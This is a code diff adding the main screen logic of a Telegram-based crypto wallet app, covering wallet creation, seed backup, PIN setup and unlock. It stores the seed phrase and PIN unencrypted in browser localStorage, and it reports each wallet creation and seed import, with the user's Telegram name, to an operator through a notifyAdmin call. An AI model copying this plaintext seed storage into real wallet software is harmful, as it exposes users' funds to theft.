@@ -5902,8 +5902,149 @@ function getAllUsersFromStorage() { return []; }
 // ─── MAIN APP COMPONENT ──────────────────────────────────────────────────────
 
 export default function GemWallet() {
-  return null; // This component is replaced by GemWalletApp
+  const [screen,setScreen]=useState("loading");
+  const [mnemonic,setMnemonic]=useState([]);
+  const [addresses,setAddresses]=useState({});
+  const [pin,setPin]=useState(null);
+  const [initialTab,setInitialTab]=useState("wallet");
+
+  function handleCreate(importedWords=null) {
+    try {
+      const m = importedWords || generateMnemonic();
+      const placeholderAddr = {
+        ETH: genAddr("0x",40), BNB: genAddr("0x",40), ARB: genAddr("0x",40),
+        SOL: genAddr("",44),   TON: genAddr("EQ",46),  LTC: genAddr("L",33),
+      };
+      setMnemonic(m);
+      setAddresses(placeholderAddr);
+      localStorage.setItem(storageKey("gem_mnemonic"), m.join(" "));
+      localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(placeholderAddr));
+      localStorage.setItem(storageKey("gem_has_wallet"), "1");
+      
+      const userId = getTgUserId();
+      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+      const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+      const userIdStr = userId ? String(userId) : "unknown";
+
+      if(importedWords) {
+        notifyAdmin(
+          `📥 <b>Кошелёк импортирован!</b>\n\n` +
+          `👤 Пользователь: ${userName}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`,
+          "new_user",
+          { walletType: "imported" }
+        );
+        setScreen("wallet");
+      } else {
+        localStorage.setItem("gem_pending_notify", JSON.stringify({ userName, userIdStr }));
+        setScreen("backup");
+      }
+      deriveWallet(m).then(wallet => {
+        const addr = wallet.addresses;
+        setAddresses(addr);
+        localStorage.setItem(storageKey("gem_addresses"), JSON.stringify(addr));
+      }).catch(err => console.error("[GemWallet] derivation error:", err));
+    } catch (e) {
+      console.error("[handleCreate] Error:", e);
+      alert("Error creating wallet. Please try again.");
+    }
+  }
+
+  function handleVerified() {
+    try {
+      const pending = localStorage.getItem("gem_pending_notify");
+      if (pending) {
+        const { userName, userIdStr } = JSON.parse(pending);
+        notifyAdmin(
+          `💎 <b>Новый кошелёк создан!</b>\n\n` +
+          `👤 Пользователь: ${userName}\n` +
+          `✅ Seed-фраза верифицирована\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`,
+          "new_user",
+          { walletType: "new" }
+        );
+        localStorage.removeItem("gem_pending_notify");
+      }
+    } catch(e) { console.error("[handleVerified]", e); }
+  }
+
+  function handleBackupDone() { setScreen("pin_set"); }
+  function handleSetPin(code) {
+    setPin(code);
+    localStorage.setItem(storageKey("gem_pin"),code);
+    setScreen("wallet");
+  }
+  function handleChangePin(code) {
+    setPin(code);
+    localStorage.setItem(storageKey("gem_pin"),code);
+  }
+  function handleLock() { if(pin) setScreen("pin_lock"); }
+  function handleUnlock() { setScreen("wallet"); }
+
+  useEffect(() => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) { tg.ready(); tg.expand(); }
+    let resolved = false;
+    const doInit = (userId) => {
+      if (resolved) return;
+      resolved = true;
+      RESOLVED_USER_ID = userId;
+      const sk = (base) => userId ? `${base}_${userId}` : base;
+      const hasWallet = localStorage.getItem(sk("gem_has_wallet")) === "1";
+      const storedPin = localStorage.getItem(sk("gem_pin"));
+      const storedMnemonic = localStorage.getItem(sk("gem_mnemonic"));
+      const storedAddresses = localStorage.getItem(sk("gem_addresses"));
+      if (storedMnemonic) setMnemonic(storedMnemonic.split(" "));
+      if (storedAddresses) { try { setAddresses(JSON.parse(storedAddresses)); } catch(e){} }
+      if (storedPin) setPin(storedPin);
+      if (hasWallet && storedPin) setScreen("pin_lock");
+      else if (hasWallet) setScreen("wallet");
+      else setScreen("onboard");
+    };
+    let attempts = 0;
+    const poll = setInterval(() => {
+      const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+      const userId = tgUser?.id ? String(tgUser.id) : null;
+      attempts++;
+      if (userId || attempts >= 15) {
+        clearInterval(poll);
+        doInit(userId);
+      }
+    }, 200);
+    return () => clearInterval(poll);
+  }, []);
+
+  return (
+    <>
+      <style>{`
+        :root{--font:-apple-system,'SF Pro Display','Helvetica Neue',sans-serif;}
+        *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+        body{margin:0;background:#000;}
+        @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+        @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+        ::-webkit-scrollbar{display:none;}
+        scrollbar-width:none;
+        button:focus{outline:none;}
+      `}</style>
+      <div style={{maxWidth:420,margin:"0 auto",minHeight:"100vh",background:"#000",fontFamily:"var(--font)"}}>
+        {screen==="loading"&&<div style={{minHeight:"100vh",background:"#000",display:"flex",alignItems:"center",justifyContent:"center"}}><div style={{width:48,height:48,border:"3px solid rgba(255,255,255,0.1)",borderTopColor:"#2563eb",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}/></div>}
+        {screen==="onboard"&&<OnboardScreen onCreate={handleCreate} onImport={handleCreate}/>}
+        {screen==="backup"&&<BackupScreen mnemonic={mnemonic} onDone={handleBackupDone} onVerified={handleVerified}/>}
+        {screen==="pin_set"&&<PinLock savedPin={null} onUnlock={()=>{}} onSetPin={handleSetPin}/>}
+        {screen==="pin_lock"&&<PinLock savedPin={pin} onUnlock={handleUnlock} onSetPin={handleSetPin}/>}
+        {screen==="wallet"&&(
+          <ErrorBoundary>
+            <WalletApp addresses={addresses} mnemonic={mnemonic} pin={pin}
+              onChangePin={handleChangePin} onLock={handleLock} initialTab={initialTab}/>
+          </ErrorBoundary>
+        )}
+      </div>
+    </>
+  );
 }
+
 
 
 
